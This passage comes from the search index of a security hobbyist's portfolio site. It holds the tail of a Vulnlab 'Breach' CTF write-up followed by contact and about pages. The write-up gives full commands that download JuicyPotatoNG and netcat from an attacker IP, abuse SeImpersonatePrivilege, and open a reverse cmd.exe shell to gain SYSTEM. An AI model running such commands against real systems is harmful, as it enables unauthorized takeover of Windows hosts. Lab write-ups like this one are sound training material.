Enabled by default, Enabled group, Group owner LOCAL Well-known group S-1-2-0 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\NTLM Authentication Well-known group S-1-5-64-10 Mandatory group, Enabled by default, Enabled group Mandatory Label\\High Mandatory Level Label S-1-16-12288 PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ========================================= ======== SeAssignPrimaryTokenPrivilege Replace a process level token Disabled SeIncreaseQuotaPrivilege Adjust memory quotas for a process Disabled SeMachineAccountPrivilege Add workstations to domain Disabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeManageVolumePrivilege Perform volume maintenance tasks Enabled SeImpersonatePrivilege Impersonate a client after authentication Enabled SeCreateGlobalPrivilege Create global objects Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Disabled we see the SeImpersonatePrivilege present which only means one thing\u0026hellip; POTATO!\nbut\u0026hellip; again the AV proved to be the most annoying part of this box.\nNow we need to get JuicyPotatoNG and Netcat on the box, here are the methods i used:\nInvoke-WebRequest -Uri http://10.8.7.149/JuicyPotatoNG.exe -OutFile C:\\Windows\\Temp\\JuicyPotatoNG.exe wget -usebasicparsing http://10.8.7.149/nc64.exe -o nc64.exe Then perform the attack -\n.\\JuicyPotatoNG.exe -p \u0026#34;C:\\users\\svc_mssql\\nc64.exe\u0026#34; -a \u0026#34;-e cmd.exe 10.8.7.149 443\u0026#34; -t * PS C:\\Windows\\system32 \u0026gt; whoami NT\\authority system ","date":"19 settembre 2025","externalUrl":null,"permalink":"/writeups/vulnlab-breach/","section":"Writeups","summary":"\u003ch2 class=\"relative group\"\u003eOverview \n    \u003cdiv id=\"overview\" class=\"anchor\"\u003e\u003c/div\u003e\n    \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline\" href=\"#overview\" aria-label=\"Anchor\"\u003e#\u003c/a\u003e\n    \u003c/span\u003e        \n    \n\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003ePlatform\u003c/strong\u003e: Vulnlab\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eDifficulty\u003c/strong\u003e: Medium\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eOS\u003c/strong\u003e: Windows\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eSkills\u003c/strong\u003e: Active Directory, privilege escalation, mssql\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cem\u003e\u003cstrong\u003eAssumed Breach Credentials: No assumed breach\u003c/strong\u003e\u003c/em\u003e\u003c/p\u003e","title":"Vulnlab-Breach","type":"writeups"},{"content":"","externalUrl":null,"permalink":"/it/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","externalUrl":null,"permalink":"/it/","section":"Bailey's Portfolio","summary":"","title":"Bailey's Portfolio","type":"page"},{"content":"","externalUrl":null,"permalink":"/it/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":" Get in Touch # $ ping bailey.security PING bailey.security: 56 data bytes 64 bytes from bailey: icmp_seq=0 ttl=64 time=0.123ms 64 bytes from bailey: icmp_seq=1 ttl=64 time=0.089ms --- bailey.security ping statistics --- Connection established ✓ Socials # Email: baileyjamesbradshaw@gmail.com\nLinkedIn: https://www.linkedin.com/in/bailey-bradshaw-194597198/\nGitHub: https://github.com/0xBeejay\nDiscord: .beejay\nFor Security Researchers # If you\u0026rsquo;ve found something interesting in my work or want to collaborate on research, feel free to reach out through any of the above channels.\nResponsible Disclosure # Found a vulnerability in something I\u0026rsquo;ve built? Please reach out via secure email first.\n$ echo \u0026#34;Thanks for visiting!\u0026#34; Thanks for visiting! $ history | tail -1 418 echo \u0026#34;Always happy to connect with fellow security enthusiasts\u0026#34; ","externalUrl":null,"permalink":"/contact/","section":"Contact","summary":"\u003ch1 class=\"relative group\"\u003eGet in Touch \n    \u003cdiv id=\"get-in-touch\" class=\"anchor\"\u003e\u003c/div\u003e\n    \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline\" href=\"#get-in-touch\" aria-label=\"Anchor\"\u003e#\u003c/a\u003e\n    \u003c/span\u003e        \n    \n\u003c/h1\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ ping bailey.security\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ePING bailey.security: \u003cspan style=\"color:#ae81ff\"\u003e56\u003c/span\u003e data bytes\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e64\u003c/span\u003e bytes from bailey: icmp_seq\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e ttl\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e64\u003c/span\u003e time\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e0.123ms\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e64\u003c/span\u003e bytes from bailey: icmp_seq\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e ttl\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e64\u003c/span\u003e time\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e0.089ms\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e--- bailey.security ping statistics ---\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eConnection established ✓\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 class=\"relative group\"\u003eSocials \n    \u003cdiv id=\"socials\" class=\"anchor\"\u003e\u003c/div\u003e\n    \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline\" href=\"#socials\" aria-label=\"Anchor\"\u003e#\u003c/a\u003e\n    \u003c/span\u003e        \n    \n\u003c/h2\u003e\n\u003cp\u003e\u003cstrong\u003eEmail\u003c/strong\u003e: \u003ccode\u003ebaileyjamesbradshaw@gmail.com\u003c/code\u003e\u003cbr\u003e\n\u003cstrong\u003eLinkedIn\u003c/strong\u003e: \u003ca\n  href=\"https://linkedin.com/in/your-profile\"\n    target=\"_blank\"\n  \u003ehttps://www.linkedin.com/in/bailey-bradshaw-194597198/\u003c/a\u003e\u003cbr\u003e\n\u003cstrong\u003eGitHub\u003c/strong\u003e: \u003ca\n  href=\"https://github.com/yourusername\"\n    target=\"_blank\"\n  \u003ehttps://github.com/0xBeejay\u003c/a\u003e\u003cbr\u003e\n\u003cstrong\u003eDiscord\u003c/strong\u003e: .beejay\u003c/p\u003e","title":"Contact","type":"contact"},{"content":"","externalUrl":null,"permalink":"/it/series/","section":"Series","summary":"","title":"Series","type":"series"},{"content":"","externalUrl":null,"permalink":"/it/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":"$ whoami bailey $ id uid=1337(bailey) gid=100(hackers) groups=100(hackers),27(sudo) $ cat /etc/passwd | grep bailey bailey:x:1337:100:Security Researcher:/home/bailey:/bin/bash Background # Passionate about cybersecurity with focus on ethical hacking and penetration testing. Currently developing skills through hands-on lab environments, CTF competitions, and responsible disclosure practices.\nInterests # specialties: - Active Directory exploitation - Network Penetration Testing - OSINT \u0026amp; Reconnaissance - Web app testing tools: - Burp Suite - Metasploit - sliver c2 - Nmap - Wireshark - impacket - crackmapexec environments: - HackTheBox - TryHackMe - VulnHub - PortSwigger Labs Current Focus # Preparing for OSCP certification Contributing to security research community $ ls -la /home/bailey/skills/ drwxr-xr-x 2 bailey hackers 4096 2024-09-19 learning/ drwxr-xr-x 2 bailey hackers 4096 2024-09-19 writeups/ drwxr-xr-x 2 bailey hackers 4096 2024-09-19 projects/ -rw-r--r-- 1 bailey hackers 42 2024-09-19 TODO.txt $ cat TODO.txt Always learning, always improving. ","externalUrl":null,"permalink":"/about/","section":"whoami","summary":"\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ whoami\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ebailey\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ id\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003euid\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e1337\u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003ebailey\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e gid\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e100\u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003ehackers\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e groups\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e100\u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003ehackers\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e,27\u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003esudo\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ cat /etc/passwd | grep bailey\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ebailey:x:1337:100:Security Researcher:/home/bailey:/bin/bash\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 class=\"relative group\"\u003eBackground \n    \u003cdiv id=\"background\" class=\"anchor\"\u003e\u003c/div\u003e\n    \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline\" href=\"#background\" aria-label=\"Anchor\"\u003e#\u003c/a\u003e\n    \u003c/span\u003e        \n    \n\u003c/h2\u003e\n\u003cp\u003ePassionate about cybersecurity with focus on ethical hacking and penetration testing. Currently developing skills through hands-on lab environments, CTF competitions, and responsible disclosure practices.\u003c/p\u003e","title":"whoami","type":"about"}]